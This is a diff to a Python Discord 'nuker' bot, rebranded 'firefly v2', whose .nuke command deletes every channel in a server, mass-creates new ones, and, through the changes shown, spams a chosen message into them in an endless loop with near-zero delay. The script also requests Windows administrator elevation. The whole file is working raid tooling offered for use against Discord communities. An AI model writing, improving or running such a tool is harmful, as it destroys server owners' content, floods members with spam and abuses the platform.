@@ -1,5 +1,6 @@
 # https://github.com/z3ro-c0nfig/basic-discord-nuker
 
+import asyncio
 import discord
 from discord.ext import commands
 from pyfiglet import figlet_format
@@ -14,6 +15,7 @@ from pyuac import main_requires_admin
 
 @main_requires_admin
 def main():
+    print("MAKE SURE TO CLOSE THE PROCESS BEHIND THIS!")
     print("hit any key to continue")
     input("made by aki0")
 
@@ -34,8 +36,7 @@ def hex_to_ansi(hex_color):
 
 def rainbow_gradient(text, phase):
     purple_colors = [
-        '#7D1B7E', '#801A80', '#831983', '#861886', '#891789',
-        '#8C168C', '#8F158F', '#921492', '#951195', '#980E98'
+        '#FF0000', '#FF0000', '#FF0000', '#FF0000', '#FF0000',
     ]
     color_step = len(purple_colors) / len(text)
 
@@ -63,7 +64,7 @@ def animate_rainbow(text):
         if elapsed_time >= duration:
             break
         
-        time.sleep(0.1)
+        time.sleep(0.000000000001)
 
 def set_console_title(bot, title):
     ctypes.windll.kernel32.SetConsoleTitleW(title)
@@ -73,7 +74,7 @@ def run_as_admin():
     params = f"{sys.executable} {script}"
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
 
-text = figlet_format("nuker", font="bloody")
+text = figlet_format("firefly v2", font="standard")
 animate_rainbow(text)
 
 @bot.event
@@ -81,8 +82,12 @@ async def on_ready():
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="made by aki0"))
     print(f"Logged in as: {bot.user}")
     print(f"use .nuke to nuke")
-    title = f"nuker | made by aki0 | guns.lol/aki0 | {bot.user.name} | online"
+    title = f"firefly v2 | made by aki0 | guns.lol/aki0 | {bot.user} | online"
     set_console_title(bot, title)
+
+import asyncio
+
+import asyncio
 
 @bot.command()
 async def nuke(ctx):
@@ -91,6 +96,7 @@ async def nuke(ctx):
         channel_name = input("Enter the name for the channels: ")
         message = input("Enter the message to send: ")
 
+        # Delete all existing channels
         for channel in ctx.guild.channels:
             try:
                 await channel.delete()
@@ -98,18 +104,27 @@ async def nuke(ctx):
             except Exception as e:
                 print(f"Error deleting channel {channel.name}: {e}")
 
+        created_channels = []
         for i in range(num_channels):
             try:
                 new_channel = await ctx.guild.create_text_channel(channel_name, position=i)
                 print(f"Created channel: {channel_name}")
-
-                await new_channel.send(message)
-                print(f"Sent message to channel: {channel_name}")
+                created_channels.append(new_channel)
             except Exception as e:
                 print(f"Error creating channel {channel_name}: {e}")
 
+        while True:
+            for channel in created_channels:
+                try:
+                    asyncio.create_task(channel.send(message))
+                except Exception as e:
+                    print(f"Error sending message to channel {channel.name}: {e}")
+
+            await asyncio.sleep(0.00000000000001)  # Adjust the sleep time for faster or slower sending
+
     except Exception as e:
         print(f"Error: {e}")
+
 
 bot_token = input("Enter your bot token: ")
 
